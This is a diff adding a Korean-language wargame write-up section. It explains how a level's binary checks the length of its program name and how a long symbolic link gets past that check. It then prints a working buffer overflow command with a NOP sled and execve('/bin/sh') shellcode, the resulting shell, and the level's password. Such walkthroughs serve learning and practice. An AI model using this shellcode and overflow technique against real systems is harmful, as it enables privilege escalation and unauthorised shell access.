@@ -571,9 +571,29 @@ gdb로 lv7가 무슨 프로그램인지 확인해보자.
    0x0804863c <+316>:	leave  
    0x0804863d <+317>:	ret  
 ```
-이번에는 초반에 ```argv[0]```을 검사한다.  
+이번에는 초반에 ```argv[0]```길이를 검사한다.  
 만약 ```./lv7 aaa```를 입력하여 lv7을 실행했다고 가정해보자.   
 이때 ``argv[0]`` 은 `./lv7`이되며 `argv[1]`은 `aaa`가 된다.
+
+즉, `argv[0]`길이를 검사한다는 것은 실행파일 이름 길이를 검사한다는 뜻이다.  
+실행파일 이름이 77바이트 이상이어야 정상 작동하므로 심볼릭 링크를 이용하여 해결하자.
+
+```ln -s [원본 파일 또는 디렉토리] [심볼릭 링크 이름]```
+
+심볼릭 링크 이름으로 ./a(75개)를 생성해주고 lv7대신 ./a(75개)를 실행시켜 문제를 해결해준다.   
+```
+lv6@ubuntu:~$ ./aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa `perl -e 'print "a"x44, "\x8c\xd3\xff\xff"'` `perl -e 'print "\x90"x500, "\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"'`
+aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa����
+$ whoami
+lv7
+$ id
+uid=1007(lv7) gid=1006(lv6) groups=1006(lv6)
+$ my-pass
+do you know argv?
+$ 
+```
+알아낸 lv7 비번 : do you know argv?
+
 ## lv 7
 ## lv 8
 ## lv 9
